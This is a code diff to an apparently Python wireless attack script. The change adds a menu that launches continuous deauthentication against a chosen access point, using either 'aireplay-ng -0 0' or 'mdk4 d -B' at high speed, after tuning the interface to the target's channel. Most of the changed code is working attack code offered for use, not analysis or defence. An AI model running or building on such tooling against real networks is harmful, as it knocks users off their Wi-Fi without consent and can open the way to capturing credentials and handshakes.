@@ -3,7 +3,7 @@ import argparse
 import subprocess
 import re
 import os
-import signal
+import string
 import shutil
 import sys
 import csv
@@ -51,12 +51,40 @@ def uninstall_script():
     sys.exit(0)
 
 def start_deauth(bssid, channel, iface):
-    """Launch mdk4 inside xterm and wait until it's closed or interrupted."""
-    # place xterm at bottom-right using negative geometry offsets
-    # ensure interface is on target channel, then run aireplay-ng deauth (continuous)
+    """Launch mdk4 or aireplay-ng inside xterm based on user's choice."""
+
+    print(Fore.CYAN + Style.BRIGHT + "\n----- Select Attack Method -----" + Style.RESET_ALL)
+    print(f"{Fore.YELLOW}1. {Fore.RESET}aireplay-ng (classic, stable)")
+    print(f"{Fore.YELLOW}2. {Fore.RESET}mdk4 (stronger, faster, more aggressive)")
+    print()
+    
+    choice = input(f"{Fore.GREEN}[?] {Fore.WHITE}Choose Method: ").strip()
+
+    if choice == "1":
+        tool = "aireplay"
+        cmd_str = f"aireplay-ng -0 0 -a {bssid} {iface}"
+    elif choice == "2":
+        tool = "mdk4"
+        cmd_str = f"mdk4 {iface} d -B {bssid} -s 9999"
+    else:
+        print(Fore.RED + "[!] Invalid choice." + Style.RESET_ALL)
+        return
+    
+    print(f"{Fore.GREEN}[+] {Fore.WHITE}Setting channel {channel} on interface {iface}...")
     set_channel(iface, channel)
-    cmd = ["xterm", "-geometry", "80x24-0-0", "-fg", "red", "-bg", "black", "-e", "bash", "-lc",
-           f"aireplay-ng -0 0 -a {bssid} {iface}"]
+
+    print(f"{Fore.GREEN}[+] {Fore.WHITE}Attacking {bssid} using interface {iface} with {tool}...")
+    print(f"{Fore.GREEN}[+] {Fore.WHITE}Press CTRL+C to stop the attack...")
+
+    cmd = [
+        "xterm",
+        "-geometry", "80x24-0-0",
+        "-fg", "red",
+        "-bg", "black",
+        "-e", "bash", "-lc",
+        cmd_str
+    ]
+
     p = None
     try:
         p = subprocess.Popen(cmd)
@@ -67,10 +95,11 @@ def start_deauth(bssid, channel, iface):
         if p:
             try:
                 p.terminate()
-            except Exception:
+            except:
                 pass
-    
+        
         print(f"{Fore.GREEN}[+] {Fore.WHITE}Attack stopped.")
+
 
 def set_channel(iface, channel):
     subprocess.run(["iw", iface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -139,7 +168,7 @@ def interactive_choose(aps):
     print(f"\n{Fore.CYAN}{Style.BRIGHT}----- Detected Access Points -----{Style.NORMAL}")
 
     for i, (bssid, ch, rssi, ssid) in enumerate(aps):
-        print(f"{Fore.YELLOW}{i+1}. {Fore.WHITE}{ssid}\t"
+        print(f"{Fore.YELLOW}{i+1}. {Fore.WHITE}{ssid if ssid else f"{Fore.RED}Err"}\t"
               f"{Fore.GREEN}CH:{ch}\t"
               f"{Fore.CYAN}RSSI:{rssi}\t"
               f"{Fore.CYAN}BSSID:{bssid}")
@@ -187,9 +216,6 @@ def main():
 
     target_bssid, channel = interactive_choose(aps)
     bssid = target_bssid
-
-    print(f"{Fore.GREEN}[+] {Fore.WHITE}Attacking {bssid} using interface {args.iface}")
-    print(f"{Fore.GREEN}[+] {Fore.WHITE}Press CTRL+C to stop the attack...")
 
     start_deauth(bssid, channel, args.iface)
 
